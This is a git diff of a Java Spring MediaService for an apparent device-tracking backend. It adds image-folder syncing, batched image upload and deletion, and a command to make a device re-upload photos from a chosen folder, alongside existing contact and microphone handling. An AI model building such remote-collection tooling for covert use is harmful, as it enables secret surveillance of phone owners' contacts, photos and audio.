@@ -23,18 +23,27 @@ import java.util.UUID;
 import com.manish.device_tracker_api.dto.ContactItem;
 import com.manish.device_tracker_api.dto.ContactPayload;
 import com.manish.device_tracker_api.dto.ContactResponse;
+import com.manish.device_tracker_api.dto.ImageFolderPayload;
+import com.manish.device_tracker_api.dto.ImageFolderResponse;
+import com.manish.device_tracker_api.dto.ImageFolderSyncRequest;
+import com.manish.device_tracker_api.dto.ImageRefreshRequest;
 import com.manish.device_tracker_api.dto.ImageResponse;
+import com.manish.device_tracker_api.dto.ImageSyncRequest;
 import com.manish.device_tracker_api.dto.MicRequest;
 import com.manish.device_tracker_api.entity.Audio;
 import com.manish.device_tracker_api.entity.Contact;
+import com.manish.device_tracker_api.entity.DeviceImageFolder;
 import com.manish.device_tracker_api.entity.DeviceInfo;
 import com.manish.device_tracker_api.entity.Image;
 import com.manish.device_tracker_api.entity.Video;
 import com.manish.device_tracker_api.repository.AudioRepo;
 import com.manish.device_tracker_api.repository.ContactRepo;
+import com.manish.device_tracker_api.repository.DeviceImageFolderRepo;
 import com.manish.device_tracker_api.repository.DeviceInfoRepository;
 import com.manish.device_tracker_api.repository.ImageRepo;
 import com.manish.device_tracker_api.repository.VideoRepo;
+
+import jakarta.transaction.Transactional;
 import lombok.extern.slf4j.Slf4j;
 
 @Slf4j
@@ -54,13 +63,14 @@ public class MediaService {
     private AudioRepo audioRepo;
 
     @Autowired
+    private DeviceImageFolderRepo deviceImageFolderRepo;
+
+    @Autowired
     private DeviceInfoRepository deviceInfoRepository;
 
     public void saveContact(ContactPayload request) {
 
-        if (request == null
-                || request.getContacts() == null
-                || request.getContacts().isEmpty()) {
+        if (request == null || request.getContacts() == null || request.getContacts().isEmpty()) {
             return;
         }
 
@@ -138,9 +148,8 @@ public class MediaService {
         deviceInfoRepository.save(device);
     }
 
-    public void saveImages(
-            String deviceId,
-            List<MultipartFile> files) throws IOException {
+    @Transactional
+    public void saveImages(String deviceId, List<MultipartFile> files, Boolean clearOld) throws IOException {
 
         File folder = new File("uploads");
 
@@ -148,15 +157,36 @@ public class MediaService {
             folder.mkdirs();
         }
 
-        imageRepo.deleteByDeviceId(deviceId);
+        // Delete old images only in first batch
+        if (Boolean.TRUE.equals(clearOld)) {
+
+            List<Image> oldImages = imageRepo.findByDeviceIdOrderByImageNameAsc(deviceId);
+
+            for (Image oldImage : oldImages) {
+
+                if (oldImage.getImageUrl() != null) {
+
+                    String fileName = oldImage.getImageUrl().replace("/uploads/", "");
+
+                    File oldFile = new File(folder, fileName);
+
+                    if (oldFile.exists()) {
+                        oldFile.delete();
+                    }
+                }
+            }
+
+            imageRepo.deleteByDeviceId(deviceId);
+        }
 
         List<Image> imageList = new ArrayList<>();
 
         for (MultipartFile file : files) {
 
             String fileName = UUID.randomUUID() + "_" + file.getOriginalFilename();
-
-            Path path = Paths.get("uploads", fileName);
+            log.info("Uploading : {}", file.getOriginalFilename());
+            log.info("Size : {}", file.getSize());
+            Path path = Paths.get(folder.getAbsolutePath(), fileName);
 
             Files.copy(
                     file.getInputStream(),
@@ -174,7 +204,9 @@ public class MediaService {
             imageList.add(image);
         }
 
-        imageRepo.saveAll(imageList);
+        if (!imageList.isEmpty()) {
+            imageRepo.saveAll(imageList);
+        }
 
         DeviceInfo device = deviceInfoRepository
                 .findByDeviceId(deviceId)
@@ -241,6 +273,61 @@ public class MediaService {
 
         device.setImagesUploaded(false);
         device.setRefreshImages(true);
+
+        deviceInfoRepository.save(device);
+    }
+
+    @Transactional
+    public void syncFolders(ImageFolderSyncRequest request) {
+
+        deviceImageFolderRepo.deleteByDeviceId(request.getDeviceId());
+
+        List<DeviceImageFolder> folders = new ArrayList<>();
+
+        for (ImageFolderPayload item : request.getFolders()) {
+
+            DeviceImageFolder folder = DeviceImageFolder.builder()
+                    .deviceId(request.getDeviceId())
+                    .bucketId(item.getBucketId())
+                    .folderName(item.getFolderName())
+                    .imageCount(item.getImageCount())
+                    .syncedAt(LocalDateTime.now())
+                    .build();
+
+            folders.add(folder);
+        }
+
+        deviceImageFolderRepo.saveAll(folders);
+    }
+
+    public List<ImageFolderResponse> getFolders(String deviceId) {
+
+        return deviceImageFolderRepo.findByDeviceIdOrderByFolderNameAsc(deviceId)
+                .stream()
+                .map(folder -> ImageFolderResponse.builder()
+                        .bucketId(folder.getBucketId())
+                        .folderName(folder.getFolderName())
+                        .imageCount(folder.getImageCount())
+                        .build())
+                .toList();
+    }
+
+    public void refreshImages(ImageRefreshRequest request) {
+
+        DeviceInfo device = deviceInfoRepository.findByDeviceId(request.getDeviceId())
+                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+
+        device.setRefreshImages(true);
+
+        device.setImagesUploaded(false);
+
+        device.setImageBucketId(request.getBucketId());
+
+        device.setImageLimit(request.getLimit());
+
+        device.setImageOffset(request.getOffset());
+
+        device.setImageOrder(request.getOrder());
 
         deviceInfoRepository.save(device);
     }
